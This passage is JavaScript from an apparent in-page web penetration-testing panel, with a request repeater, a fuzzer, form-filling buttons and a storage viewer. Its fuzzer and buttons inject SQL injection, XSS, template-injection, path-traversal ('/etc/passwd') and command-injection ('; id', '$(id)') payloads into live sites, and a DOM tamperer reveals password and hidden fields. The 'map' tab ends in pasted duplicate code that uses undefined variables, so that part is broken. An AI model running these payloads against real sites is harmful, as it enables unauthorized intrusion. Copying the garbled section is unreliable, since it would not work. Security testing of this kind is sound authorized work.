                bodyLabel.innerText = 'Body:';
                bodyLabel.style.fontSize = '10px';
                bodyLabel.style.color = '#aaa';
                repeaterDiv.appendChild(bodyLabel);
                
                var bodyInput = document.createElement('textarea');
                bodyInput.id = 'vx-rep-body';
                bodyInput.style.width = '100%';
                bodyInput.style.height = '60px';
                bodyInput.style.background = '#222';
                bodyInput.style.color = '#fff';
                bodyInput.style.border = '1px solid #444';
                bodyInput.style.marginBottom = '8px';
                bodyInput.style.fontFamily = 'monospace';
                bodyInput.style.fontSize = '10px';
                repeaterDiv.appendChild(bodyInput);
                
                var btnGroup = document.createElement('div');
                btnGroup.style.display = 'flex';
                btnGroup.style.gap = '10px';
                btnGroup.style.marginBottom = '8px';

                var sendBtn = document.createElement('button');
                sendBtn.innerText = 'Send Request';
                sendBtn.style.background = '#004488';
                sendBtn.style.color = '#fff';
                sendBtn.style.border = '1px solid #0088ff';
                sendBtn.style.padding = '4px 8px';
                sendBtn.style.borderRadius = '3px';
                sendBtn.style.cursor = 'pointer';
                btnGroup.appendChild(sendBtn);
                
                var fuzzBtn = document.createElement('button');
                fuzzBtn.innerText = 'Fuzz Selection (Intruder)';
                fuzzBtn.style.background = '#660000';
                fuzzBtn.style.color = '#fff';
                fuzzBtn.style.border = '1px solid #ff0055';
                fuzzBtn.style.padding = '4px 8px';
                fuzzBtn.style.borderRadius = '3px';
                fuzzBtn.style.cursor = 'pointer';
                fuzzBtn.title = "Highlight a piece of text in the URL or Body to inject payloads.";
                btnGroup.appendChild(fuzzBtn);

                repeaterDiv.appendChild(btnGroup);

                var fuzzerStatus = document.createElement('div');
                fuzzerStatus.id = 'vx-fuzzer-status';
                fuzzerStatus.style.display = 'none';
                fuzzerStatus.style.marginBottom = '8px';
                fuzzerStatus.style.fontSize = '10px';
                fuzzerStatus.style.color = '#ffcc00';
                repeaterDiv.appendChild(fuzzerStatus);
                
                var respDiv = document.createElement('div');
                respDiv.id = 'vx-rep-response';
                respDiv.style.display = 'none';
                respDiv.style.borderTop = '1px solid #444';
                respDiv.style.paddingTop = '8px';
                
                var respStatus = document.createElement('div');
                respStatus.id = 'vx-rep-status';
                respStatus.style.fontWeight = 'bold';
                respStatus.style.marginBottom = '4px';
                respDiv.appendChild(respStatus);
                
                var respBody = document.createElement('textarea');
                respBody.id = 'vx-rep-respbody';
                respBody.style.width = '100%';
                respBody.style.height = '100px';
                respBody.style.background = '#111';
                respBody.style.color = '#00ff55';
                respBody.style.border = '1px solid #333';
                respBody.style.fontFamily = 'monospace';
                respBody.style.fontSize = '10px';
                respBody.readOnly = true;
                respDiv.appendChild(respBody);
                
                repeaterDiv.appendChild(respDiv);
                container.appendChild(repeaterDiv);
                
                // Repeater logic
                document.addEventListener('click', function(e) {
                    if (e.target && e.target.id === 'vx-close-repeater') {
                        document.getElementById('vx-repeater').style.display = 'none';
                    }
                });
                
                sendBtn.onclick = async function() {
                    sendBtn.innerText = 'Sending...';
                    sendBtn.disabled = true;
                    respDiv.style.display = 'none';
                    
                    var method = methodSelect.value;
                    var url = urlInput.value;
                    var body = bodyInput.value;
                    var headersStr = headersInput.value;
                    var headers = {};
                    try {
                        headers = JSON.parse(headersStr);
                    } catch(e) {}
                    
                    var opts = { method: method, headers: headers, credentials: 'omit' };
                    if (method !== 'GET' && method !== 'HEAD' && body) {
                        opts.body = body;
                    }
                    
                    try {
                        var res = await fetch(url, opts);
                        var text = await res.text();
                        respStatus.innerText = 'HTTP ' + res.status;
                        respStatus.style.color = res.ok ? '#00ff55' : '#ff0055';
                        respBody.value = text;
                        respDiv.style.display = 'block';
                    } catch(err) {
                        respStatus.innerText = 'Error: ' + err.message;
                        respStatus.style.color = '#ff0055';
                        respBody.value = '';
                        respDiv.style.display = 'block';
                    }
                    sendBtn.innerText = 'Send Request';
                    sendBtn.disabled = false;
                };

                fuzzBtn.onclick = async function() {
                    // Try to get selected text from URL or Body
                    var activeEl = document.activeElement;
                    var isUrl = activeEl && activeEl.id === 'vx-rep-url';
                    var isBody = activeEl && activeEl.id === 'vx-rep-body';
                    
                    if (!isUrl && !isBody) {
                        alert("Please click inside the URL or Body field and highlight the text you want to fuzz (e.g. highlight '1' in id=1).");
                        return;
                    }

                    var selectionStart = activeEl.selectionStart;
                    var selectionEnd = activeEl.selectionEnd;
                    
                    if (selectionStart === selectionEnd) {
                        alert("Please highlight/select the specific text you want to replace with payloads.");
                        return;
                    }

                    var originalText = activeEl.value;
                    var prefix = originalText.substring(0, selectionStart);
                    var suffix = originalText.substring(selectionEnd);
                    var targetString = originalText.substring(selectionStart, selectionEnd);

                    if (!confirm("Start Fuzzer? We will inject payloads into the highlighted parameter: '" + targetString + "'")) {
                        return;
                    }

                    fuzzBtn.disabled = true;
                    fuzzBtn.style.opacity = '0.5';
                    fuzzerStatus.style.display = 'block';
                    respDiv.style.display = 'none';

                    var payloads = [
                        "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or #", 
                        "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '",
                        "admin' --", "admin' #", "' OR 'x'='x",
                        "<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[5*5]]",
                        "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
                        ";id", "|id", "`id`", "$(id)"
                    ];

                    var method = methodSelect.value;
                    var headersStr = headersInput.value;
                    var headers = {};
                    try { headers = JSON.parse(headersStr); } catch(e) {}

                    var url = urlInput.value;
                    var body = bodyInput.value;

                    var hits = 0;
                    var errors = 0;

                    for (let i = 0; i < payloads.length; i++) {
                        var p = payloads[i];
                        fuzzerStatus.innerText = `Fuzzing: ${i+1}/${payloads.length} [Payload: ${p}]`;
                        
                        var f_url = url;
                        var f_body = body;

                        if (isUrl) f_url = prefix + encodeURIComponent(p) + suffix;
                        if (isBody) f_body = prefix + p + suffix;

                        var opts = { method: method, headers: headers, credentials: 'omit' };
                        if (method !== 'GET' && method !== 'HEAD' && f_body) {
                            opts.body = f_body;
                        }

                        try {
                            var res = await fetch(f_url, opts);
                            var text = await res.text();
                            
                            // Check for simple reflection or errors
                            var interesting = false;
                            if (res.status >= 500) interesting = true;
                            if (text.includes("syntax error") || text.includes("mysql") || text.includes("Warning:") || text.includes("Exception")) interesting = true;
                            if (p === "<script>alert(1)</script>" && text.includes(p)) interesting = true;
                            if (p === "{{7*7}}" && text.includes("49")) interesting = true;
                            
                            if (interesting) {
                                hits++;
                                // Log to traffic so user can review it
                                window.__vulcanx_state.traffic.unshift({
                                    id: Math.random().toString(),
                                    method: method,
                                    url: f_url,
                                    display_url: f_url.length > 150 ? f_url.substring(0,150) + "..." : f_url,
                                    status_code: res.status,
                                    time: new Date().toTimeString().split(' ')[0],
                                    req_headers: headers,
                                    req_body: f_body
                                });
                            }
                        } catch(e) {
                            errors++;
                        }
                    }

                    fuzzerStatus.innerText = `Fuzzing Complete! ${hits} interesting responses found. Check Traffic tab. (Errors: ${errors})`;
                    fuzzBtn.disabled = false;
                    fuzzBtn.style.opacity = '1';
                    
                    if (hits > 0) {
                        window.__vulcanx_render();
                        alert(`Fuzzer finished. Found ${hits} potentially vulnerable responses. They have been added to the top of your Traffic log for review!`);
                    } else {
                        setTimeout(() => fuzzerStatus.style.display = 'none', 5000);
                    }
                };

                if (traffic.length === 0) {
                    var emptyMsg = document.createElement('div');
                    emptyMsg.innerHTML = '<div style="color:#666;text-align:center;margin-top:50px;">No traffic intercepted yet.</div>';
                    container.appendChild(emptyMsg);
                    return;
                }

                var table = document.createElement('table');
                table.className = 'vx-table';
                table.innerHTML = `<thead>
                                    <tr>
                                        <th style="width:60px;">Time</th>
                                        <th style="width:40px;">Method</th>
                                        <th>URL</th>
                                        <th style="width:45px;">Status</th>
                                    </tr>
                                   </thead>`;
                var tbody = document.createElement('tbody');
                traffic.forEach((t, i) => {
                    var tr = document.createElement('tr');
                    tr.style.cursor = 'pointer';
                    var stColor = t.status_code >= 400 ? '#ff5500' : (t.status_code >= 300 ? '#ffcc00' : '#00ff55');
                    tr.innerHTML = `<td>${t.time}</td>
                                    <td style="font-weight:bold;color:#4da6ff;">${t.method}</td>
                                    <td style="color:#aaa;word-break:break-all;" title="${t.url}">${t.display_url || t.url}</td>
                                    <td style="color:${stColor};font-weight:bold;">${t.status_code || 'PENDING'}</td>`;
                    
                    tr.onmouseover = () => tr.style.background = '#333';
                    tr.onmouseout = () => tr.style.background = 'transparent';
                    
                    tr.onclick = function() {
                        document.getElementById('vx-repeater').style.display = 'block';
                        document.getElementById('vx-rep-method').value = t.method;
                        document.getElementById('vx-rep-url').value = t.url;
                        
                        // Parse headers if they exist
                        var hStr = '{}';
                        if (t.req_headers) {
                            try {
                                hStr = JSON.stringify(t.req_headers, null, 2);
                            } catch(e){}
                        }
                        document.getElementById('vx-rep-headers').value = hStr;
                        document.getElementById('vx-rep-body').value = t.req_body || '';
                        
                        document.getElementById('vx-rep-response').style.display = 'none';
                        document.getElementById('vx-repeater').scrollIntoView({ behavior: 'smooth', block: 'start' });
                    };
                    
                    tbody.appendChild(tr);
                });
                table.appendChild(tbody);
                container.appendChild(table);
} else if (tab === 'forms') {

container.innerHTML = '';
                
                var hlBtn = document.createElement('button');
                hlBtn.innerText = window.__vulcanx_state.highlighting ? 'Disable Input Highlight' : 'Enable Input Highlight';
                hlBtn.style.width = '100%';
                hlBtn.style.padding = '8px';
                hlBtn.style.background = window.__vulcanx_state.highlighting ? '#800000' : '#006644';
                hlBtn.style.color = '#fff';
                hlBtn.style.border = 'none';
                hlBtn.style.borderRadius = '4px';
                hlBtn.style.cursor = 'pointer';
                hlBtn.style.fontWeight = 'bold';
                hlBtn.style.marginBottom = '12px';
                
                hlBtn.onclick = function() {
                    window.__vulcanx_state.highlighting = !window.__vulcanx_state.highlighting;
                    window.__vulcanx_toggle_inputs();
                    window.__vulcanx_render();
                };
                container.appendChild(hlBtn);

                var inputs = Array.from(document.querySelectorAll('input:not([type="hidden"]), textarea'));
                if (inputs.length === 0) {
                    var noInput = document.createElement('div');
                    noInput.style.color = '#666';
                    noInput.style.textAlign = 'center';
                    noInput.style.marginTop = '20px';
                    noInput.innerText = 'No input fields found on the current page.';
                    container.appendChild(noInput);
                    return;
                }

                var fillAllXSS = document.createElement('button');
                fillAllXSS.innerText = 'Fill All XSS';
                fillAllXSS.style.width = '30%';
                fillAllXSS.style.padding = '8px';
                fillAllXSS.style.background = '#440055';
                fillAllXSS.style.color = '#fff';
                fillAllXSS.style.border = '1px solid #ff00ff';
                fillAllXSS.style.borderRadius = '4px';
                fillAllXSS.style.cursor = 'pointer';
                fillAllXSS.style.fontWeight = 'bold';
                fillAllXSS.style.marginBottom = '12px';
                fillAllXSS.style.marginRight = '2%';
                fillAllXSS.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, '\"><script>alert(document.domain)</script>'); } else { input.value = '\"><script>alert(document.domain)</script>'; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff00ff';
                    });
                };
                container.appendChild(fillAllXSS);
                
                var fillAllSQLi = document.createElement('button');
                fillAllSQLi.innerText = 'Fill All SQLi';
                fillAllSQLi.style.width = '30%';
                fillAllSQLi.style.padding = '8px';
                fillAllSQLi.style.background = '#331100';
                fillAllSQLi.style.color = '#fff';
                fillAllSQLi.style.border = '1px solid #ff5500';
                fillAllSQLi.style.borderRadius = '4px';
                fillAllSQLi.style.cursor = 'pointer';
                fillAllSQLi.style.fontWeight = 'bold';
                fillAllSQLi.style.marginBottom = '12px';
                fillAllSQLi.style.marginRight = '2%';
                fillAllSQLi.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff5500';
                    });
                };
                container.appendChild(fillAllSQLi);
                
                var tamperDOM = document.createElement('button');
                tamperDOM.innerText = 'Tamper DOM (Reveal All)';
                tamperDOM.style.width = '100%';
                tamperDOM.style.padding = '8px';
                tamperDOM.style.background = '#004400';
                tamperDOM.style.color = '#00ff55';
                tamperDOM.style.border = '1px solid #00ff55';
                tamperDOM.style.borderRadius = '4px';
                tamperDOM.style.cursor = 'pointer';
                tamperDOM.style.fontWeight = 'bold';
                tamperDOM.style.marginBottom = '12px';
                tamperDOM.onclick = function() {
                    // Reveal hidden inputs, convert passwords to text, remove maxlengths and disabled attributes
                    var modifiedCount = 0;
                    document.querySelectorAll('input, select, textarea, button').forEach(el => {
                        if (el.type === 'hidden') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.type === 'password') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('disabled')) {
                            el.removeAttribute('disabled');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('readonly')) {
                            el.removeAttribute('readonly');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('maxlength')) {
                            el.removeAttribute('maxlength');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                    });
                    if (modifiedCount > 0) {
                        alert("DOM Tampering Active! " + modifiedCount + " elements modified (revealed hidden fields, removed disabled/readonly/maxlength attributes).");
                    } else {
                        alert("No restricted DOM elements found to tamper with.");
                    }
                };
                container.appendChild(tamperDOM);

                var clearAll = document.createElement('button');
                clearAll.innerText = 'Clear Forms';
                clearAll.style.width = '30%';
                clearAll.style.padding = '8px';
                clearAll.style.background = '#222';
                clearAll.style.color = '#fff';
                clearAll.style.border = '1px solid #444';
                clearAll.style.borderRadius = '4px';
                clearAll.style.cursor = 'pointer';
                clearAll.style.fontWeight = 'bold';
                clearAll.style.marginBottom = '12px';
                clearAll.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, ""); } else { input.value = ""; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '';
                    });
                };
                container.appendChild(clearAll);


                var table = document.createElement('table');
                table.className = 'vx-table';
                table.innerHTML = `<thead>
                                    <tr>
                                        <th>Name/ID</th>
                                        <th>Type</th>
                                        <th>Actions</th>
                                    </tr>
                                   </thead>`;
                var tbody = document.createElement('tbody');
                inputs.forEach((input, index) => {
                    var identifier = input.name || input.id || `Input #${index+1}`;
                    var type = input.tagName === 'TEXTAREA' ? 'textarea' : (input.type || 'text');
                    
                    var tr = document.createElement('tr');
                    var tdName = document.createElement('td');
                    tdName.innerText = identifier;
                    tdName.style.color = '#aaa';
                    tr.appendChild(tdName);

                    var tdType = document.createElement('td');
                    tdType.innerText = type;
                    tr.appendChild(tdType);

                    var tdActions = document.createElement('td');
                    
                    var fillXSS = document.createElement('button');
                    fillXSS.innerText = 'Fill XSS';
                    fillXSS.style.fontSize = '9px';
                    fillXSS.style.marginRight = '4px';
                    fillXSS.style.background = '#440055';
                    fillXSS.style.border = '1px solid #ff00ff';
                    fillXSS.style.color = '#fff';
                    fillXSS.style.borderRadius = '3px';
                    fillXSS.style.cursor = 'pointer';
                    fillXSS.onclick = function() {
                        // Use a native value setter to bypass React's property descriptor overrides
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) {
                            setter.call(input, '\"><script>alert(document.domain)</script>');
                        } else {
                            input.value = '\"><script>alert(document.domain)</script>';
                        }
                        
                        // Dispatch events so frontend frameworks (React, Angular, Vue) register the change
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        
                        input.focus();
                        input.style.border = '2px solid #ff00ff';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillXSS);

                    var fillSQL = document.createElement('button');
                    fillSQL.innerText = 'Fill SQLi';
                    fillSQL.style.fontSize = '9px';
                    fillSQL.style.marginRight = '4px';
                    fillSQL.style.background = '#331100';
                    fillSQL.style.border = '1px solid #ff5500';
                    fillSQL.style.color = '#fff';
                    fillSQL.style.borderRadius = '3px';
                    fillSQL.style.cursor = 'pointer';
                    fillSQL.onclick = function() {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #ff5500';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillSQL);

                    var fillSSTI = document.createElement('button');
                    fillSSTI.innerText = 'Fill SSTI';
                    fillSSTI.style.fontSize = '9px';
                    fillSSTI.style.marginRight = '4px';
                    fillSSTI.style.background = '#002244';
                    fillSSTI.style.border = '1px solid #0088ff';
                    fillSSTI.style.color = '#fff';
                    fillSSTI.style.borderRadius = '3px';
                    fillSSTI.style.cursor = 'pointer';
                    fillSSTI.onclick = function() {
                        var payload = "{{7*7}} ${7*7} <%= 7*7 %>";
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #0088ff';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillSSTI);
                    
                    var fillCMDi = document.createElement('button');
                    fillCMDi.innerText = 'Fill CMDi';
                    fillCMDi.style.fontSize = '9px';
                    fillCMDi.style.background = '#113300';
                    fillCMDi.style.border = '1px solid #22ff00';
                    fillCMDi.style.color = '#fff';
                    fillCMDi.style.borderRadius = '3px';
                    fillCMDi.style.cursor = 'pointer';
                    fillCMDi.onclick = function() {
                        var payload = "; id # | whoami";
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #22ff00';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillCMDi);

                    tr.appendChild(tdActions);
                    tbody.appendChild(tr);
                });
                table.appendChild(tbody);
                container.appendChild(table);
} else if (tab === 'storage') {

container.innerHTML = '';
                
                var refBtn = document.createElement('button');
                refBtn.innerText = 'Refresh Storage';
                refBtn.style.width = '100%';
                refBtn.style.padding = '8px';
                refBtn.style.background = '#222';
                refBtn.style.color = '#fff';
                refBtn.style.border = '1px solid #444';
                refBtn.style.borderRadius = '4px';
                refBtn.style.cursor = 'pointer';
                refBtn.style.fontWeight = 'bold';
                refBtn.style.marginBottom = '12px';
                refBtn.onclick = function() { window.__vulcanx_render(); };
                container.appendChild(refBtn);

                var items = [];
                
                // Cookies
                if (document.cookie) {
                    document.cookie.split(';').forEach(c => {
                        var parts = c.split('=');
                        items.push({
                            source: 'Cookie',
                            key: parts[0] ? parts[0].trim() : '',
                            value: parts.slice(1).join('=')
                        });
                    });
                }
                
                // LocalStorage
                for (var i = 0; i < localStorage.length; i++) {
                    var k = localStorage.key(i);
                    items.push({
                        source: 'Local',
                        key: k,
                        value: localStorage.getItem(k)
                    });
                }

                // SessionStorage
                for (var i = 0; i < sessionStorage.length; i++) {
                    var k = sessionStorage.key(i);
                    items.push({
                        source: 'Session',
                        key: k,
                        value: sessionStorage.getItem(k)
                    });
                }
                
                if (items.length === 0) {
                    var noStorage = document.createElement('div');
                    noStorage.style.color = '#666';
                    noStorage.style.textAlign = 'center';
                    noStorage.style.marginTop = '20px';
                    noStorage.innerText = 'No storage items found.';
                    container.appendChild(noStorage);
                } else {
                    var table = document.createElement('table');
                    table.className = 'vx-table';
                    table.innerHTML = `<thead>
                                        <tr>
                                            <th style="width:60px;">Source</th>
                                            <th style="width:120px;">Key</th>
                                            <th>Value</th>
                                        </tr>
                                       </thead><tbody></tbody>`;
                    var tbody = table.querySelector('tbody');
                    items.forEach(function(item) {
                        var tr = document.createElement('tr');
                        tr.innerHTML = `<td><span class="vx-badge" style="background:#333;">${item.source}</span></td>
                                        <td style="font-weight:bold;color:#ccc;">${item.key}</td>
                                        <td style="color:#aaa;">${item.value}</td>`;
                        tbody.appendChild(tr);
                    });
                    container.appendChild(table);
                }
} else if (tab === 'map') {

container.innerHTML = '';
                
                var scanBtn = document.createElement('button');
                scanBtn.innerText = 'Scan LinkMap';
                scanBtn.style.width = '100%';
                scanBtn.style.padding = '8px';
                scanBtn.style.background = '#800000';
                scanBtn.style.color = '#fff';
                scanBtn.style.border = '1px solid #ff0055';
                scanBtn.style.borderRadius = '4px';
                scanBtn.style.cursor = 'pointer';
                scanBtn.style.fontWeight = 'bold';
                scanBtn.style.marginBottom = '12px';
                
                var statusDiv = document.createElement('div');
                statusDiv.style.marginBottom = '12px';
                statusDiv.style.fontSize = '10px';
                statusDiv.style.color = '#aaa';
                statusDiv.innerText = "Status: Ready";
                
                var linksList = document.createElement('ul');
                linksList.style.listStyleType = 'none';
                linksList.style.padding = '0';
                linksList.style.margin = '0';
                
                var links = Array.from(document.querySelectorAll('a[href]')).map(a => {
                    // Browsers usually resolve a.href to a full URL, but just in case:
                    try { return new URL(a.getAttribute('href'), window.location.href).href; }
                    catch(e) { return a.href; }
                });
                var internalLinks = links.filter(href => href.startsWith(window.location.origin) && !href.includes('#') && !href.startsWith('javascript:'));
                var uniqueLinks = [...new Set(internalLinks)];
                
                scanBtn.onclick = async function() {
                    if (uniqueLinks.length === 0) {
                        alert("No internal links found to scan.");
                        return;
                    }
                    scanBtn.disabled = true;
                        scanBtn.style.opacity = '0.5';
                        statusDiv.innerText = `Scanning: 0 / ${uniqueLinks.length}`;
                        
                        let completed = 0;
                        for (let i = 0; i < uniqueLinks.length; i++) {
                            let link = uniqueLinks[i];
                            let li = linksList.children[i];
                            try {
                                li.style.color = '#ffcc00'; // in progress
                                
                                // Open link in a new background tab
                                var newWin = window.open(link, '_blank');
                                
                                // Wait for it to load, then close it
                                await new Promise(r => setTimeout(r, 2500)); 
                                if (newWin && !newWin.closed) {
                                    newWin.close();
                                }
                                
                                li.style.color = '#00ff55'; // done
                            } catch(e) {
                                li.style.color = '#ff0055'; // error
                            }
                            completed++;
                            statusDiv.innerText = `Scanning: ${completed} / ${uniqueLinks.length}`;
                        }
                        
                        statusDiv.innerText = 'Scan Complete! Check Traffic and Findings tabs.';
                        setTimeout(() => {
                            scanBtn.disabled = false;
                            scanBtn.style.opacity = '1';
                        }, 2000);
                };
                
                container.appendChild(scanBtn);
                container.appendChild(statusDiv);
                
                uniqueLinks.forEach(link => {
                    var li = document.createElement('li');
                    li.style.padding = '4px 0';
                    li.style.borderBottom = '1px solid #333';
                    li.style.fontSize = '10px';
                    li.style.wordBreak = 'break-all';
                    li.style.color = '#aaa';
                    li.innerText = link.replace(window.location.origin, '');
                    linksList.appendChild(li);
                });
                
                if (uniqueLinks.length === 0) {
                    var emptyDiv = document.createElement('div');
                    emptyDiv.innerText = 'No internal links found on this page.';
                    emptyDiv.style.color = '#666';
                    emptyDiv.style.textAlign = 'center';
                    emptyDiv.style.marginTop = '20px';
                    container.appendChild(emptyDiv);
                } else {
                    container.appendChild(linksList);
                }


                if (items.length === 0) {
                    var emptyDiv = document.createElement('div');
                    emptyDiv.style.color = '#666';
                    emptyDiv.style.textAlign = 'center';
                    emptyDiv.style.marginTop = '20px';
                    emptyDiv.innerText = 'No cookies or storage keys found.';
                    container.appendChild(emptyDiv);
                    return;
                }

                var fillAllXSS = document.createElement('button');
                fillAllXSS.innerText = 'Fill All XSS';
                fillAllXSS.style.width = '30%';
                fillAllXSS.style.padding = '8px';
                fillAllXSS.style.background = '#440055';
                fillAllXSS.style.color = '#fff';
                fillAllXSS.style.border = '1px solid #ff00ff';
                fillAllXSS.style.borderRadius = '4px';
                fillAllXSS.style.cursor = 'pointer';
                fillAllXSS.style.fontWeight = 'bold';
                fillAllXSS.style.marginBottom = '12px';
                fillAllXSS.style.marginRight = '2%';
                fillAllXSS.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, '\"><script>alert(document.domain)</script>'); } else { input.value = '\"><script>alert(document.domain)</script>'; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff00ff';
                    });
                };
                container.appendChild(fillAllXSS);
                
                var fillAllSQLi = document.createElement('button');
                fillAllSQLi.innerText = 'Fill All SQLi';
                fillAllSQLi.style.width = '30%';
                fillAllSQLi.style.padding = '8px';
                fillAllSQLi.style.background = '#331100';
                fillAllSQLi.style.color = '#fff';
                fillAllSQLi.style.border = '1px solid #ff5500';
                fillAllSQLi.style.borderRadius = '4px';
                fillAllSQLi.style.cursor = 'pointer';
                fillAllSQLi.style.fontWeight = 'bold';
                fillAllSQLi.style.marginBottom = '12px';
                fillAllSQLi.style.marginRight = '2%';
                fillAllSQLi.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff5500';
                    });
                };
                container.appendChild(fillAllSQLi);
                
                var tamperDOM = document.createElement('button');
                tamperDOM.innerText = 'Tamper DOM (Reveal All)';
                tamperDOM.style.width = '100%';
                tamperDOM.style.padding = '8px';
                tamperDOM.style.background = '#004400';
                tamperDOM.style.color = '#00ff55';
                tamperDOM.style.border = '1px solid #00ff55';
                tamperDOM.style.borderRadius = '4px';
                tamperDOM.style.cursor = 'pointer';
                tamperDOM.style.fontWeight = 'bold';
                tamperDOM.style.marginBottom = '12px';
                tamperDOM.onclick = function() {
                    // Reveal hidden inputs, convert passwords to text, remove maxlengths and disabled attributes
                    var modifiedCount = 0;
                    document.querySelectorAll('input, select, textarea, button').forEach(el => {
                        if (el.type === 'hidden') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.type === 'password') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('disabled')) {
                            el.removeAttribute('disabled');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('readonly')) {
                            el.removeAttribute('readonly');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('maxlength')) {
                            el.removeAttribute('maxlength');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                    });
                    if (modifiedCount > 0) {
